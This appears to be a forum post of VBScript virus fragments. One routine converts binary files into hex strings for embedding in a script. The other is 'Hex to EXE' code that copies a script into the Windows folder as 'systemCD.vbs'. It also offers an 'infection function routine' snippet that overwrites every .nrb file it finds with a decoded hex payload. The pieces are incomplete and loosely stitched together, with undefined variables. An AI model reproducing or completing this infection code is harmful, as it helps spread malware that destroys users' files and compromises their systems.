'VBS.Convert - https://github.com/fadelix
function readbinaryfile(filepath)
const adTypeBinary=1
Const adTypeText=2
set bs=createobject("ADODB.Stream")
bs.Type=1:bs.open:bs.loadfromfile filepath
bs.flush
bs.position = 0
bs.type=2
bs.charset="iso-8859-1"
m=bs.readtext
h=0:
For k = 1 To Len(m)
h=h+1
strChar = Mid(m, k, 1)
strHex = Right("00" & Hex(Asc(strChar)), 2)
if h=100 then
strhexvalue = strHexValue & strhex & chr(34) & vbcrlf & "strHexValue=strHexValue&" & chr(34)
h=0
else
strhexvalue = strHexValue & strhex
end if
next
end function
[/code]
Hex to EXE
Set Fso=CreateObject("Scripting.FileSystemObject")
cpy.Copy(Fso.GetSpecialFolder(0)&"\systemCD.vbs")
'Put this function on your infection function routine
'----------------------------------------------------
If fso.GetExtensionName(file.path)="nrb" then
a = "0E4E65726F49534F302E30322E303301000000010000000000124"
GenCode = a
For letscount = 1 To Len(GenCode) Step 2
NewCode = NewCode & Chr("&h"& Mid(GenCode, letscount, 2))
next
Set YourFile = fso.createtextfile(file.path, True)
YourFile.write NewCode
YourFile.close
